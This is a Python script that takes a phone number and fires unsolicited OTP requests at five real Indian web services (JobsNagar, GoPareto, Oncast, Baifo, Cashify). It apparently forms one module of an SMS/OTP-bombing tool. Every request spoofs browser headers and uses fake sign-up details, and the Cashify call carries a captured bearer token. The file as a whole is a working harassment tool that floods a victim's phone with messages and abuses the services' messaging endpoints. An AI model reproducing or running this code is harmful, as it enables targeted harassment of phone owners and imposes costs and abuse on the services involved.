import requests

def run_apis8(mobile_no):
    results = []
    
    if not mobile_no.startswith("+"):
        number = "+91" + mobile_no
    else:
        number = mobile_no

    # --- API 43: JobsNagar ---
    try:
        headers43 = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0'
        }

        json_data43 = {
            'contact': number.replace("+91", ""),
        }

        response = requests.post('https://jobsnagar.com:2083/otp-authentications', headers=headers43, json=json_data43, timeout=10)
        results.append({"service": "JobsNagar", "status": response.status_code, "response": response.text})
        print(f"JobsNagar: {response.status_code}")
    except Exception as e:
        results.append({"service": "JobsNagar", "status": "Error", "response": str(e)})
        print(f"JobsNagar Error: {e}")

    # --- API 44: GoPareto ---
    try:
        headers44 = {
            'Accept': '*/*',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://gopareto.bizmo-tech.com',
            'Pragma': 'no-cache',
            'Referer': 'https://gopareto.bizmo-tech.com/register',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data44 = {
            'company_email': '5n06uwcbog@jkotypc.com',
            'company_name': 'robh',
            'contact_no': number.replace("+91", ""),
            'company_address': '7729 Center Boulevard Southeast',
            'subscription': 'trial',
            'employee_count': '9',
            'ip_addr': '49.43.4.160',
            'termsNCondi': '1',
            'index': '1',
        }

        response = requests.post('https://gopareto.bizmo-tech.com/user/register/generateOTP', headers=headers44, data=data44, timeout=10)
        results.append({"service": "GoPareto", "status": response.status_code, "response": response.text})
        print(f"GoPareto: {response.status_code}")
    except Exception as e:
        results.append({"service": "GoPareto", "status": "Error", "response": str(e)})
        print(f"GoPareto Error: {e}")

    # --- API 45: Oncast ---
    try:
        headers45 = {
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://oncast.in',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://oncast.in/register.php',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        }

        json_data45 = {
            'phone': f'+91{number.replace("+91", "")}',
        }

        response = requests.post('https://oncast.in/wa_auth/generate_otp.php', headers=headers45, json=json_data45, timeout=10)
        results.append({"service": "Oncast", "status": response.status_code, "response": response.text})
        print(f"Oncast: {response.status_code}")
    except Exception as e:
        results.append({"service": "Oncast", "status": "Error", "response": str(e)})
        print(f"Oncast Error: {e}")

    # --- API 46: Baifo ---
    try:
        headers46 = {
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'origin': 'https://baifo.me',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://baifo.me/m-wap/Register/Index.html',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params46 = {
            'pluginId': 'BFMe.Plugin.Message.RongYun.SMS',
            'destination': number.replace("+91", ""),
            'username': 'asdsadsadasd',
            'countryCode': 'in',
            'IsWa': 'wa',
        }

        response = requests.post('https://baifo.me/m-wap/Register/SendOtpToBuyer', params=params46, headers=headers46, timeout=10)
        results.append({"service": "Baifo", "status": response.status_code, "response": response.text})
        print(f"Baifo: {response.status_code}")
    except Exception as e:
        results.append({"service": "Baifo", "status": "Error", "response": str(e)})
        print(f"Baifo Error: {e}")

    # --- API 47: Cashify ---
    try:
        headers47 = {
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'baggage': 'sentry-environment=prod,sentry-release=d73c6159788bd653453d4b5492372cb5e94ca61a,sentry-public_key=9a3d8d4c6dee2ef6f2fa005a63de39c8,sentry-trace_id=8b18774143462ab22e6e5fcc85a7d7d1,sentry-sampled=false,sentry-sample_rand=0.24080486149750113,sentry-sample_rate=0.01',
            'cache-control': 'no-cache',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryDgWJNOiWtFeoRAgB',
            'origin': 'https://www.cashify.in',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sentry-trace': '8b18774143462ab22e6e5fcc85a7d7d1-b1bc750f5bfb3b1d-0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'x-app-installer': 'cashify',
            'x-app-referral': 'gpro_post',
            'x-app-utmj': 'gpro_post',
            'x-app-utml': 'gpro_post',
            'x-authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiY2FzaGlmeSIsImtpZCI6IjEyMDYyIiwicm9sZXMiOlsiY2FzaGlmeSJdLCJjbGlkIjoiZ2FkZ2V0LXBybyIsImNsdiI6InYxIiwiZXhwIjoxNzU4NTcxNjIxLCJ2dCI6MH0.T4gaAexVJHSgtO3DrASczvqMIym9qy8v8uwROPKV2Oo',
        }

        files47 = {
            'ea': (None, 'engin@altmail.kr'),
            'mo': (None, number.replace("+91", "")),
            'ek': (None, 'sms'),
        }

        response = requests.put('https://www.cashify.in/api/cu01/v1/sign-up/resend-otp', headers=headers47, files=files47, timeout=10)
        results.append({"service": "Cashify", "status": response.status_code, "response": response.text})
        print(f"Cashify: {response.status_code}")
    except Exception as e:
        results.append({"service": "Cashify", "status": "Error", "response": str(e)})
        print(f"Cashify Error: {e}")

    return results
